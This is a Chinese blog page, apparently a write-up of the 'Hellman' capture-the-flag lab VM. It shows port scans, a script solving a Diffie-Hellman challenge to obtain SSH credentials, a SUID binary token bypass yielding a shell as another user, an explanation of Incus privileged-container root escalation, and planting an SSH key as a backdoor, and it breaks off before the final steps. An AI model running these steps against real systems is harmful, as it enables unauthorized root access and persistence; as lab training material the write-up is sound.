@@ -1,0 +1,327 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hellman_提权处理 | Rrrr'blog</title><meta name="author" content="Xiaxiaran"><meta name="copyright" content="Xiaxiaran"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、信息收集1.端口扫描12345678910$ nmap  -p- 192.168.0.110 Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2026-01-30 05:19 ESTNmap scan report for 192.168.0.110 (192.168.0.110)Host is up (0.0029s latency).Not shown">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hellman_提权处理">
+<meta property="og:url" content="http://example.com/2026/01/30/hellman-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/index.html">
+<meta property="og:site_name" content="Rrrr&#39;blog">
+<meta property="og:description" content="一、信息收集1.端口扫描12345678910$ nmap  -p- 192.168.0.110 Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2026-01-30 05:19 ESTNmap scan report for 192.168.0.110 (192.168.0.110)Host is up (0.0029s latency).Not shown">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/1.jpg">
+<meta property="article:published_time" content="2026-01-30T13:08:40.000Z">
+<meta property="article:modified_time" content="2026-01-30T13:07:17.788Z">
+<meta property="article:author" content="Xiaxiaran">
+<meta property="article:tag" content="SUID逆向分析">
+<meta property="article:tag" content="incus提权">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "hellman_提权处理",
+  "url": "http://example.com/2026/01/30/hellman-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/",
+  "image": "http://example.com/images/1.jpg",
+  "datePublished": "2026-01-30T13:08:40.000Z",
+  "dateModified": "2026-01-30T13:07:17.788Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Xiaxiaran",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="http://example.com/2026/01/30/hellman-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hellman_提权处理',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div class="bg-animation" id="web_bg" style="background: [object Object];"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/default_top_img.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Rrrr'blog</span></a><a class="nav-page-title" href="/"><span class="site-name">hellman_提权处理</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">hellman_提权处理</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-30T13:08:40.000Z" title="Created 2026-01-30 21:08:40">2026-01-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-01-30T13:07:17.788Z" title="Updated 2026-01-30 21:07:17">2026-01-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/">群友靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><h5 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1.端口扫描"></a>1.端口扫描</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nmap  -p- 192.168.0.110 </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 05:19 EST</span><br><span class="line">Nmap scan report for 192.168.0.110 (192.168.0.110)</span><br><span class="line">Host is up (0.0029s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">1337/tcp open  waste</span><br><span class="line">MAC Address: 08:00:27:7E:E4:2D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
+
+<p>发现开了一个1337端口</p>
+<h5 id="2-目录扫描"><a href="#2-目录扫描" class="headerlink" title="2.目录扫描"></a>2.目录扫描</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Target: http://192.168.0.110/</span><br><span class="line"></span><br><span class="line">[05:20:34] Starting:                                                         </span><br><span class="line">[05:20:42] 403 -  548B  - /.ht_wsr.txt                                      </span><br><span class="line">[05:20:42] 403 -  548B  - /.htaccess.bak1                                   </span><br><span class="line">[05:20:42] 403 -  548B  - /.htaccess.orig</span><br><span class="line">[05:20:42] 403 -  548B  - /.htaccess.sample</span><br><span class="line">[05:20:42] 403 -  548B  - /.htaccess.save                                   </span><br><span class="line">[05:20:42] 403 -  548B  - /.htaccess_extra</span><br><span class="line">[05:20:42] 403 -  548B  - /.htaccess_sc</span><br><span class="line">[05:20:42] 403 -  548B  - /.htaccessBAK</span><br><span class="line">[05:20:42] 403 -  548B  - /.htaccess_orig</span><br><span class="line">[05:20:42] 403 -  548B  - /.htaccessOLD                                     </span><br><span class="line">[05:20:42] 403 -  548B  - /.htaccessOLD2</span><br><span class="line">[05:20:42] 403 -  548B  - /.htm                                             </span><br><span class="line">[05:20:42] 403 -  548B  - /.html                                            </span><br><span class="line">[05:20:43] 403 -  548B  - /.htpasswd_test                                   </span><br><span class="line">[05:20:43] 403 -  548B  - /.htpasswds</span><br><span class="line">[05:20:43] 403 -  548B  - /.httr-oauth</span><br><span class="line"></span><br><span class="line">Task Completed </span><br></pre></td></tr></table></figure>
+
+<p>发现并没有什么特殊的目录</p>
+<h5 id="3-利用密钥交换协议"><a href="#3-利用密钥交换协议" class="headerlink" title="3.利用密钥交换协议"></a>3.利用密钥交换协议</h5><p>进入1337端口后可以发现是一个密钥交换程序</p>
+<p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20260130182906643.png" alt="image-20260130182906643"></p>
+<p>是一道密码题，服务端会进行 500 轮 Diffie-Hellman 密钥交换验证。每一轮服务端会提供：</p>
+<p>• 一个固定的大素数 <em>p</em></p>
+<p>• 生成元 <em>g</em> &#x3D; 2</p>
+<p>• Alice 的公钥 <em>A</em>（即 <em>A</em> &#x3D; <em>g</em> <em>a</em> mod <em>p</em>）</p>
+<p>• 一个私钥 <em>b</em></p>
+<p>需要计算共享密钥：</p>
+<p><em>S</em> &#x3D; <em>A</em> <em>b</em> mod <em>p</em></p>
+<p>用ai写一个脚本进行计算得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 1. 连接信息</span><br><span class="line">HOST = &#x27;192.168.0.110&#x27;</span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line"># 设置日志级别为 info，既能看到进度又不会被刷屏</span><br><span class="line">context.log_level = &#x27;info&#x27;</span><br><span class="line"></span><br><span class="line"># 题目提供的大质数 p</span><br><span class="line">p = 2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919</span><br><span class="line"></span><br><span class="line">conn = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">print(&quot;[*] 正在开始 500 次密钥交换...&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(500):</span><br><span class="line">    try:</span><br><span class="line">        # 接收直到出现输入提示符 &quot; &gt; &quot;</span><br><span class="line">        data = conn.recvuntil(b&#x27; &gt; &#x27;).decode()</span><br><span class="line"></span><br><span class="line">        # 使用正则表达式从文本中提取 A 和 b 的值</span><br><span class="line">        # 注意：根据你的截图，顺序是 b 在前，A 在后</span><br><span class="line">        b_match = re.search(r&#x27;b = (\d+)&#x27;, data)</span><br><span class="line">        A_match = re.search(r&#x27;A = (\d+)&#x27;, data)</span><br><span class="line"></span><br><span class="line">        if b_match and A_match:</span><br><span class="line">            b_val = int(b_match.group(1))</span><br><span class="line">            A_val = int(A_match.group(1))</span><br><span class="line"></span><br><span class="line">            # 计算共享密钥 S = A^b mod p</span><br><span class="line">            S = pow(A_val, b_val, p)</span><br><span class="line"></span><br><span class="line">            # 发送计算结果</span><br><span class="line">            conn.sendline(str(S).encode())</span><br><span class="line"></span><br><span class="line">            if (i + 1) % 50 == 0:</span><br><span class="line">                print(f&quot;[+] 已完成 &#123;i + 1&#125;/500 次交换...&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;[-] 未能在输出中找到 A 或 b，原始数据如下：&quot;)</span><br><span class="line">            print(data)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;[-] 运行出错: &#123;e&#125;&quot;)</span><br><span class="line">        break</span><br><span class="line"># 500 次结束后，Flag 应该就会出来了</span><br><span class="line">print(&quot;[*] 500 次任务已完成！正在等待 Flag...&quot;)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：676f643a6e756d626572735f6172655f68617264</p>
+<p>进行解码一下：god:numbers_are_hard</p>
+<h3 id="二、提权处理"><a href="#二、提权处理" class="headerlink" title="二、提权处理"></a>二、提权处理</h3><h5 id="1-ssh连接"><a href="#1-ssh连接" class="headerlink" title="1.ssh连接"></a>1.ssh连接</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ssh god@192.168.0.110                   </span><br><span class="line">god@192.168.0.110&#x27;s password: </span><br><span class="line">              _                          </span><br><span class="line">__      _____| | ___ ___  _ __ ___   ___ </span><br><span class="line">\ \ /\ / / _ \ |/ __/ _ \| &#x27;_ ` _ \ / _ \</span><br><span class="line"> \ V  V /  __/ | (_| (_) | | | | | |  __/</span><br><span class="line">  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|</span><br><span class="line">                                         </span><br><span class="line">Hellman:~$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-sr-x    2 god      god           4096 Jan 23 16:14 .</span><br><span class="line">drwxr-xr-x    4 root     root          4096 Jan 23 15:45 ..</span><br><span class="line">lrwxrwxrwx    1 root     god              9 Jan 23 16:11 .ash_history -&gt; /dev/null                                                                        </span><br><span class="line">-rw-r--r--    1 root     god             44 Jan 23 15:33 user.txt</span><br><span class="line">Hellman:~$ cat user.txt</span><br><span class="line">flag&#123;user-c9461249ea2e074a338b82db919b3fb9&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-查看suid"><a href="#2-查看suid" class="headerlink" title="2.查看suid"></a>2.查看suid</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hellman:~$ find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">/bin/bbsuid</span><br><span class="line">/usr/libexec/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/expiry</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/secure_auth</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br></pre></td></tr></table></figure>
+
+<p>发现有一个&#x2F;usr&#x2F;bin&#x2F;secure_auth把它拖出来看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scp god@192.168.0.110:/usr/bin/secure_auth ./secure_auth</span><br><span class="line">god@192.168.0.110&#x27;s password: </span><br><span class="line">secure_auth                                           100%   18KB 705.5KB/s   00:00 </span><br></pre></td></tr></table></figure>
+
+<p>放到ida中进行查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v4; // rdx</span><br><span class="line">  char *s; // [rsp+10h] [rbp-120h]</span><br><span class="line">  const char *s1; // [rsp+18h] [rbp-118h]</span><br><span class="line">  char s2[264]; // [rsp+20h] [rbp-110h] BYREF</span><br><span class="line">  unsigned __int64 v8; // [rsp+128h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  if ( argc &gt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    s = (char *)argv[1];</span><br><span class="line">    s1 = argv[2];</span><br><span class="line">    xor_cipher(s, key, s2);                     // key：4b077130fw473r</span><br><span class="line">    v4 = strlen(s);</span><br><span class="line">    if ( !memcmp(s1, s2, v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;[+] Auth successful. Switching to UID 1002...&quot;);</span><br><span class="line">      if ( setresgid(0x3EAu, 0x3EAu, 0x3EAu) )</span><br><span class="line">        perror(&quot;setresgid failed&quot;);</span><br><span class="line">      if ( setresuid(0x3EAu, 0x3EAu, 0x3EAu) )</span><br><span class="line">        perror(&quot;setresuid failed&quot;);</span><br><span class="line">      system(s);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;[-] Auth failed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Usage: %s &lt;command&gt; &lt;token&gt;\n&quot;, *argv);</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-分析main函数"><a href="#3-分析main函数" class="headerlink" title="3.分析main函数"></a>3.分析main函数</h5><p>主要逻辑：</p>
+<ol>
+<li>发现有两个参数<command><token></li>
+<li>将用户输入的commond与key4b077130fw473r进行异或计算 结果存入s2</li>
+<li>比较token与s2是否相等</li>
+<li>若相等切换到UID&#x2F;GID 1002（water用户）并执行command</li>
+</ol>
+<h5 id="4-执行-sh"><a href="#4-执行-sh" class="headerlink" title="4.执行 sh"></a>4.执行 sh</h5><p>如果该程序成功运行了 <code>sh</code>，得到的命令行窗口就直接拥有了 <code>water</code> 用户的身份（UID 1002），而不再是原来的 <code>god</code> 用户 </p>
+<p>s (0x73) XOR 4 (0x34) &#x3D; G</p>
+<p>h (0x68) XOR b (0x62) &#x3D; \n</p>
+<p>所以正确的token就是G\n</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hellman:~$ /usr/bin/secure_auth sh &quot;$(printf &#x27;G\nx&#x27;)&quot;</span><br><span class="line">//因为 Linux 的命令替换 $() 会自动删掉末尾的换行符，所以必须在后面加一个无关字符（如 x）来“顶住”那个关键的 \n</span><br><span class="line">[+] Auth successful. Switching to UID 1002...</span><br><span class="line">~ $ id</span><br><span class="line">uid=1002(water) gid=1002(water) groups=1001(god) </span><br></pre></td></tr></table></figure>
+
+<h5 id="5-water提权"><a href="#5-water提权" class="headerlink" title="5.water提权"></a>5.water提权</h5><p>查看water历史记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~ $ cd /home/water</span><br><span class="line">/home/water $ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-sr-x    2 water    water         4096 Jan 23 15:46 .</span><br><span class="line">drwxr-xr-x    4 root     root          4096 Jan 23 15:45 ..</span><br><span class="line">-rw-------    1 water    water           63 Jan 23 15:47 .ash_history</span><br><span class="line">/home/water $ cat .ash_history </span><br><span class="line">incus</span><br><span class="line">ls -l /var/lib/incus/unix.socket</span><br><span class="line">addgroup god incus</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<p>发现有一个incus</p>
+<p>Incus 提权是一种经典的“配置不当”利用方式。其核心逻辑在于：<strong>容器管理员可以决定容器如何访问宿主机的资源</strong>。</p>
+<ul>
+<li><p><strong>Socket 权限利用</strong>：</p>
+<ul>
+<li>攻击者发现 <code>water</code> 用户在 <code>incus</code> 组内 。</li>
+<li>由于 <code>/var/lib/incus/unix.socket</code> 文件对 <code>incus</code> 组可写，<code>water</code> 用户可以直接向 Incus 守护进程发送指令 。</li>
+</ul>
+</li>
+<li><p><strong>特权容器</strong>：</p>
+<ul>
+<li>通过命令 <code>incus init ... -c security.privileged=true</code> 创建一个特权容器 。</li>
+<li>在特权模式下，容器内的 Root 用户等同于宿主机的 Root 用户，打破了容器的隔离屏障 。</li>
+</ul>
+</li>
+<li><p><strong>挂载宿主机根目录</strong>：</p>
+<ul>
+<li>利用 <code>incus config device add</code> 命令，将宿主机的整个根文件系统（<code>/</code>）挂载到容器内部的某个路径（如 <code>/mnt/root</code>） 。</li>
+<li>这意味着，当你在容器里查看 <code>/mnt/root</code> 时，实际上是在以 Root 权限查看和操作宿主机的所有敏感文件（如 <code>/etc/shadow</code> 或 Root 的私钥） 。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/home/water $ grep incus /etc/group</span><br><span class="line">incus:x:106:water</span><br><span class="line">incus-user:x:107:</span><br><span class="line">incus-admin:x:108:</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>发现water在里面 用kali生成一下密钥（为了在目标机器上留下一个“后门”）</p>
+<p>一旦将 Kali 的公钥写入 <code>water</code> 用户的 <code>.ssh/authorized_keys</code> ，攻击者之后随时可以从 Kali 通过 <code>ssh -i water_key water@IP</code> 登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ssh-keygen -t rsa -f water_key</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter passphrase for &quot;water_key&quot; (empty for no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved in water_key</span><br><span class="line">Your public key has been saved in water_key.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:qMWo14vobbQC9CugriQOiTevk0j3PLNOtoN7Ns3TTK4 root@kali</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|                 |</span><br><span class="line">|                 |</span><br><span class="line">|                 |</span><br><span class="line">| .   o .         |</span><br><span class="line">|. . . + S        |</span><br><span class="line">|+o +.+   .       |</span><br><span class="line">|O+=oB++ =        |</span><br><span class="line">|Bo+O=@.= +       |</span><br><span class="line">|++=*O+BEo        |</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line">                                                                                        </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# cat water_key.pub</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCm7PC8+xt3Umwu8Txo6VjBS3oBkUP2JRqucpRuuceeBC87Vf/CT7FDtw/QAwFWcLwrqMbIMA+T+AjkAYjGi/nAyTA6sBScH1/PMcy4HjxISaFQ6udCVzEiKUYmpi+/n4/nRf63hUTtnJcum+cOPyRbhC2jbihYOSIAl2U+/zXMO1fgc57iTvISRAiOY+eImjGqi4cS/8PpuyTvuzXxmMkSP5XfssOBMW6+16F9sLyY1YYoZM2k1FakL62BuQtwgGJ9XkWk+EJ1qGNOR4c6Z7ufKBLTWV6p2ypfGlxfOdoRW98KgwVmwo3W6NXtR75n8v7FBYGWjJdc/DYeYQVCq2E2gJG5n1l1oD2u8siGpM/935FnsNqA6lmBrF5nq71EzZBGmCexJcPo2mhT4o5zAe4/x5LO3HITY/KHmFavzgq5QnN6DDuQoZPTYGO3AmheQOECqT8i82mAlpA1uy1PkHUj/pC/0U/qibYbdmcFLYaYmJDdZxtjnRiMuQyS3m5lID8= root@kali</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>回到靶机</p>
